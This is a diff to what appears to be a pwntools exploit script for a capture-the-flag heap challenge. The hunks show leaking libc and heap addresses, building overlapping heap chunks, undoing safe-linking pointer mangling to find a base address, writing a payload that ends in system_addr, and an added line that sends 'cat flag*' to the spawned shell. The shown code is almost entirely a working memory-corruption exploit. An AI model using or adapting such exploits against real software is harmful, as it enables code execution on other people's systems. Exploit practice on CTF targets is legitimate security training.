@@ -48,7 +48,6 @@ def show(idx):
     io.sendlineafter("Index: ", str(idx))
 
 
-# 常规泄漏libc， heap
 for i in range(9):
     create(i, 0xf0)
 
@@ -70,7 +69,7 @@ heap = u64(io.recvuntil("\x05")[-5:].ljust(8, b"\x00"))
 heap = heap << 12
 log.success("heap:-----> " + hex(heap))
 
-# 制造叠堆，使2个指针指向同一地址
+
 create(0, 0xf8)
 create(1, 0xf8)
 create(2, 0xf8)
@@ -117,7 +116,8 @@ create(5, 0x18)
 create(6, 0x18)
 delete(5)
 show(1)
-v = u64(io.recvuntil("\x55")[-6:].ljust(8, b"\x00"))
+io.recvuntil("Data: ")
+v = u64(io.recv(6).ljust(8, b"\x00"))
 ebase = heap >> 12 ^ leak_addr >> 12 ^ v
 ebase -= 0x1160
 log.success("ebase:-----> " + hex(ebase))
@@ -178,5 +178,5 @@ payload += p64(system_addr)
 ddebug(f"b *{libc.address+0x000000000010f75b} \ncontinue")
 edit(0, payload)
 
-
+io.sendline(b"cat flag*")
 io.interactive()
